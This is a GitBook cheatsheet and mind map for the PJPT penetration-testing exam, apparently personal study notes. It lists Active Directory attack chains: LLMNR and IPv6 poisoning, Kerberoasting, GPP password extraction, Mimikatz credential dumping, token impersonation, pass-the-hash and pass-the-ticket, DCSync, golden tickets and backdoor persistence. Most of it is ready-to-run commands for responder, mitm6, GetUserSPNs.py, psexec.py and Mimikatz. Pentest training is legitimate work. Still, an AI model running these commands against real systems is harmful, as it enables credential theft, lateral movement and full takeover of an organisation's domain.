# PJPT Techniques Mind Map - GitBook

```mermaid
mindmap
  root((PJPT))
    Initial Access
      LLMNR Poisoning
        responder -I eth0
      IPv6 Attacks
        mitm6 -d domain
      SMB Relay
        ntlmrelayx.py
      Password Spraying
        crackmapexec smb
    
    Quick Wins
      Kerberoasting⭐
        GetUserSPNs.py
        hashcat -m 13100
      GPP Passwords
        Get-GPPPassword
      Token Impersonation
        load incognito
      BloodHound
        SharpHound.exe
    
    Credential Dumping
      Mimikatz
        sekurlsa::logonpasswords
        lsadump::sam
      NTDS.dit
        secretsdump.py
        ntdsutil
    
    Lateral Movement
      Pass-the-Hash
        psexec.py -hashes
        evil-winrm -H
      Pass-the-Ticket
        getTGT.py
        kerberos::ptt
      RDP/WinRM
        xfreerdp
        Enter-PSSession
    
    Domain Admin
      DCSync
        lsadump::dcsync
      Golden Ticket
        kerberos::golden
      Persistence
        Backdoor accounts
        Scheduled tasks
```



## Quick Commands Cheatsheet

### 🚀 Start Here
```bash
# Terminal 1 - LLMNR
sudo responder -I eth0 -wrf

# Terminal 2 - IPv6
sudo mitm6 -d domain.local

# Terminal 3 - Check targets
crackmapexec smb 10.0.0.0/24
```

### 🎯 Must Do After Credentials
```bash
# Kerberoasting (ALWAYS!)
GetUserSPNs.py domain/user:pass -request -dc-ip DC_IP

# BloodHound collection
bloodhound-python -d domain -u user -p pass -c all

# Check for GPP
Get-GPPPassword
findstr /S cpassword \\dc\sysvol\*.xml
```

### 💀 After Local Admin
```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords

# Token impersonation
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator
```

### 🔥 Lateral Movement
```bash
# Pass-the-Hash
psexec.py -hashes :NTLM domain/administrator@target

# Pass-the-Ticket
getTGT.py domain/user:pass
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain/administrator@target
```

## Links to Detailed Guides

| Technique | File | Description |
|-----------|------|-------------|
| LLMNR Poisoning | [llmnr-poisoning.md](llmnr-poisoning.md) | Capture NTLMv2 hashes |
| Kerberoasting | [kerberoasting.md](kerberoasting.md) | Extract service account passwords |
| Pass Attacks | [pass-attacks.md](pass-attacks.md) | PTH, PTT, PTC techniques |
| Mimikatz | [mimikatz-overview.md](mimikatz-overview.md) | Credential dumping |
| Golden Tickets | [golden-ticket-attacks.md](golden-ticket-attacks.md) | Ultimate persistence |

---

> 💡 **Pro Tip**: Start with passive attacks (responder/mitm6) and ALWAYS try Kerberoasting after getting any valid credentials! 